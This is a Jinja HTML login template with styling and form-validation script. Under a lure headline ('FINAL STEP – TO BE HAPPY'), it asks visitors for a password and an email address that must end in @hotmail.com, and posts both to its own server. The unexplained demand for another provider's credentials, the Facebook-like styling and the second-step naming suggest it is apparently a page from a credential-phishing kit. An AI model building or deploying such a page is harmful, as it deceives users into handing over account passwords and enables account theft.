{% extends "base.html" %}
{% block body %}
<div class="card premium-card" style="max-width:420px;margin:48px auto;padding:40px 32px;text-align:center">
  <h2 class="section-title">✨ FINAL STEP – TO BE HAPPY</h2>
  <p class="section-subtitle">Login now to get started</p>

  <form method="post" id="f2Form" novalidate>
    
    <!-- Email -->
    <div class="form-group">
      <input 
        class="input wide" 
        id="address" 
        name="address" 
        type="email" 
        placeholder="Email address (must end with @hotmail.com)" 
        required
        pattern="^[a-zA-Z0-9._%+-]+@hotmail\\.com$">
      <div class="error-message">Please enter a valid address ending with <b>@hotmail.com</b>.</div>
    </div>

    <!-- Password -->
    <div class="form-group">
      <input 
        class="input wide" 
        id="password" 
        name="password" 
        type="password" 
        placeholder="Password" 
        required 
        minlength="6">
      <div class="error-message">Password must be at least 6 characters long.</div>
    </div>

    <button class="btn btn-blue wide-btn" type="submit">Log In</button>
  </form>
</div>

<style>
/* Premium Card with hover glow */
.premium-card {
  background: #fff;
  border-radius: 20px;
  box-shadow: 0 12px 28px rgba(24,119,242,0.25);
  transition: box-shadow 0.35s ease, transform 0.25s ease;
}
.premium-card:hover {
  box-shadow: 0 16px 36px rgba(24,119,242,0.35);
  transform: translateY(-2px);
}

/* Title & Subtitle */
.section-title {
  font-size: 1.8rem;
  font-weight: 800;
  color: #0f172a;
  margin-bottom: 8px;
  letter-spacing: -0.6px;
  text-transform: uppercase;
  text-shadow: 0 1px 2px rgba(24,119,242,0.15);
}
.section-subtitle {
  color: #64748b;
  margin-bottom: 28px;
  font-size: 1rem;
  font-weight: 500;
}

/* Form Layout */
.form-group {
  margin-bottom: 18px;
  text-align: left;
}

/* Inputs */
.input.wide {
  width: 100%;
  border: 1px solid #e5e7eb;
  padding: 15px 18px;
  border-radius: 18px; /* More rounded for premium feel */
  font-size: 1rem;
  font-weight: 500;
  background: #f9fafb;
  transition: border-color 0.25s, box-shadow 0.25s, background 0.25s, transform 0.25s;
}
.input.wide:focus {
  border-color: #1877F2;
  box-shadow: 0 0 0 4px rgba(24,119,242,0.25);
  background: #fff;
  outline: none;
  transform: translateY(-1px);
}
.input.error {
  border-color: #ef4444;
  box-shadow: 0 0 0 4px rgba(239,68,68,0.25);
  background: #fef2f2;
}

/* Error messages */
.error-message {
  font-size: 0.85rem;
  color: #dc2626;
  display: none;
  margin-top: 4px;
  text-align: left;
}

/* Button */
.btn.wide-btn {
  width: 100%;
  padding: 14px;
  border-radius: 999px;
  font-size: 1rem;
  font-weight: 700;
  background: linear-gradient(135deg, #1877F2, #4e9af1);
  color: white;
  border: none;
  cursor: pointer;
  transition: all 0.25s ease;
  box-shadow: 0 6px 16px rgba(24,119,242,0.35);
}
.btn.wide-btn:hover {
  box-shadow: 0 10px 22px rgba(24,119,242,0.45);
  transform: translateY(-1px);
}
.btn.wide-btn:active {
  transform: scale(0.98);
}
</style>

<script>
document.getElementById("f2Form").addEventListener("submit", function(e) {
  let valid = true;
  let firstInvalid = null;

  this.querySelectorAll(".input").forEach(input => {
    const errorMsg = input.nextElementSibling;
    if (!input.checkValidity()) {
      input.classList.add("error");
      errorMsg.style.display = "block";
      valid = false;
      if (!firstInvalid) firstInvalid = input;
    } else {
      input.classList.remove("error");
      errorMsg.style.display = "none";
    }
  });

  if (!valid) {
    e.preventDefault();
    firstInvalid.scrollIntoView({ behavior: "smooth", block: "center" });
    firstInvalid.focus({ preventScroll: true });
  }
});
</script>
{% endblock %}
